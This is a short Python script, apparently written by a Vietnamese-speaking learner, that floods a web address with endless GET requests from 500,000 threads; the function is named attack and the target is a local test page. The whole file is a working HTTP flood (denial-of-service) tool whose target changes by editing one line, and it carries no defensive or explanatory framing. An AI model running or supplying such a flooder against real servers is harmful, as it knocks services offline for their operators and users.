import threading
import requests
import time
target_url="http://127.0.0.1:5500/test/test11.html"
threa_C=500000
def attack():
    while True:
        try:
            respon=requests.get(target_url)
            print("Đang gửi request...")
        except requests.exceptions.ConnectionError:
            print("nghẽn")
            time.sleep(0.01)
for i in range(threa_C):
    t=threading.Thread(target=attack)
    t.daemon=True
    t.start()
while True:
    time.sleep(1)
